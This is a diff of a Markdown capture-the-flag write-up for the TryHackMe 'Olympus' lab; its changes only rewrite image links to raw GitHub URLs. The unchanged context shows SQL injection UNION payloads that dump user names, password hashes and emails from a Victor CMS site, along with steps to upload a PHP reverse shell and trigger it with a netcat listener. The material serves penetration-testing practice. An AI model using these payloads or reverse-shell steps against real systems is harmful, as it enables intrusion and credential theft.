@@ -75,7 +75,7 @@ ff02::2 ip6-allrouters
 
 ## HTTP Port:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a1.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a1.png)
 
 In the `index` page of `http://olympus.thm`, we can see "The old version of the website is still **accessible** on this domain.". Maybe we could find a directory that contains the old version of the website?? Let's try to find that via `feroxbuster` to enumerate any hidden directory!
 
@@ -101,7 +101,7 @@ In the `index` page of `http://olympus.thm`, we can see "The old version of the 
 
 As we can see, we see `/~webmaster/` and `/static/`. The `/~webmaster/` directory seems interesting.
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a2.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a2.png)
 
 Looks like the old version of the website is using `Victor CMS`. Let's use `searchsploit` to find public exploits.
 
@@ -139,7 +139,7 @@ By exploiting the SQL Injection vulnerability by using the mentioned payload, an
 
 Let's copy and paste the payload to test is it really vulnerable to SQL Injection!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a3.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a3.png)
 
 As we can see, it's vulnerable to SQL Injection, and successfully retrieve the database name and version of MySQL running on the server!
 
@@ -153,7 +153,7 @@ Next, we can now retrieve all databases name:
 http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(schema_name),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20information_schema.schemata--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a4.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a4.png)
 
 All databases name:
 - mysql
@@ -170,7 +170,7 @@ Hmm... `olympus` database seems interesting, let's retrieve it's table names:
 http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(TABLE_NAME),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20information_schema.TABLES%20WHERE%20table_schema=%27olympus%27--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a5.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a5.png)
 
 Database `olympus`'s all table names:
 - categories
@@ -187,7 +187,7 @@ Oh! there is a `flag` table, let's retrieve the flag! To do so, I'll first retri
 http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(column_name),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20information_schema.COLUMNS%20WHERE%20TABLE_NAME=%27flag%27--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a6.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a6.png)
 
 Database `olympus`'s table `flag` column name:
 - flag
@@ -199,7 +199,7 @@ Then, we can now retrieve it's data!
 http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(flag),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20flag--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a7.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a7.png)
 
 `flag{Redacted}`
 
@@ -210,7 +210,7 @@ Now we've retrieve the flag. The next thing we need to do is other data in the `
 http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(column_name),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20information_schema.COLUMNS%20WHERE%20TABLE_NAME=%27users%27--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a8.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a8.png)
 
 Database `olympus`'s table `users` column names:
 - randsalt
@@ -234,7 +234,7 @@ http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,c
 
 > Note: The `0x3a` means `:`.
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a9.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a9.png)
 
 Yes!! We successfully found the user names and their password *hashes*!
 
@@ -261,7 +261,7 @@ Next, we can also retrieve all data from column `user_email`!
 http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(user_email),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20users--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a10.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a10.png)
 
 Database `olympus`'s table `user_email` data:
 - prometheus@olympus.thm
@@ -290,7 +290,7 @@ Now, I think we've retrieved enough data from table `users`, let's move on to an
 http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(column_name),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20information_schema.COLUMNS%20WHERE%20TABLE_NAME=%27chats%27--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a11.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a11.png)
 
 Database `olympus`'s table `chats` all column names:
 - dt
@@ -305,11 +305,11 @@ Again, we can retrieve all data from table `chats`!
 http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(dt,0x3a,file,0x3a,msg,0x3a,uname),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20chats--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a12.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a12.png)
 
 > Note: To view it's content clearly, you can do it via `View Page Source` in FireFox.
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a13.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a13.png)
 
 ```
 2022-04-05:47c3210d51761686f3af40a875eeaaea.txt:Attached : prometheus_password.txt:prometheus
@@ -327,9 +327,9 @@ Now, I think we should have enough information to gain an initial shell, let's m
 
 Since we found `prometheus` user's credential, we can login to the admin page:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a14.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a14.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a15.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a15.png)
 
 Also, since we're authenticated to the admin page, we could upload a PHP reverse shell or webshell.
 
@@ -361,7 +361,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 As we're already login, we can just ignore step 1 and 2. Let's follow it's step and gain an initial shell!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a16.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a16.png)
 
 I'll use a PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php):
 
@@ -374,13 +374,13 @@ $port = 1234;       // CHANGE THIS
 
 Then upload it:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a17.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a17.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a18.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a18.png)
 
 Go to http://olympus.thm/~webmaster/img/revshell.php:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a19.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a19.png)
 
 Umm... 403 Forbidden?? Looks like the developers of this website has blocked people from accessing `/img/` directory...
 
@@ -392,11 +392,11 @@ Since we've found `chat.olympus.thm` subdomain in the database `olympus`'s table
 
 Let's go to http://chat.olympus.thm/ then.
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a20.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a20.png)
 
 It redirects me to a login page. Let's try use the user `prometheus` credential.
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a21.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a21.png)
 
 Hmm... This looks familiar as we saw this during the SQL Injection section.
 
@@ -440,7 +440,7 @@ This time, we found `/javascript/`, `/phpmyadmin/`, `/static/` and `/uploads/` d
 
 Let's take a look at `/uploads/` directory:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a23.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a23.png)
 
 An empty page?
 
@@ -458,20 +458,20 @@ Maybe that *txt* file is the uploaded file?? Let's verify that.
 
 Go to http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt:
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a24.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a24.png)
 
 Yes!! Our theory is correct! Now, we can combine SQL Injection and Arbitrary File Upload vulnerabilities to gain an initial shell!!
 
 First, let's upload a PHP reverse shell again. (From [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php))
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a22.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a22.png)
 
 Then, find the uploaded file name from table `chats`, column `file` via SQL Injection:
 ```sql
 http://olympus.thm/~webmaster/category.php?cat_id=-NULL+UNION+SELECT+NULL,NULL,concat(file,0x3a,msg),NULL,NULL,NULL,NULL,NULL,NULL,NULL+%20FROM%20chats--
 ```
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a25.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a25.png)
 
 Wow!! We found the uploaded file name!!
 
@@ -479,9 +479,9 @@ Finally, setup a `nc` listener on port 443, and trigger it:
 
 `http://chat.olympus.thm/uploads/1bdfe241130e582d92c96be14cb4f356.php`
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a26.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a26.png)
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a27.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a27.png)
 
 We're now `www-data`!!
 
@@ -687,13 +687,13 @@ Snodew reverse root shell backdoor?? Let's use our browser to browse that PHP we
 
 `http://10.10.xxx.xxx/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php`
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a28.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a28.png)
 
 It requires a password. However, in the `VIGQFQFMYOST.php`, we can see it's password!
 
 In the `$pass` variable, it's a string of password. Let's use that to login!
 
-![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Olympus/images/a29.png)
+![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/TryHackMe/Olympus/images/a29.png)
 
 Sweet! It's a reverse shell root backdoor! Let's make a reverse shell!
 
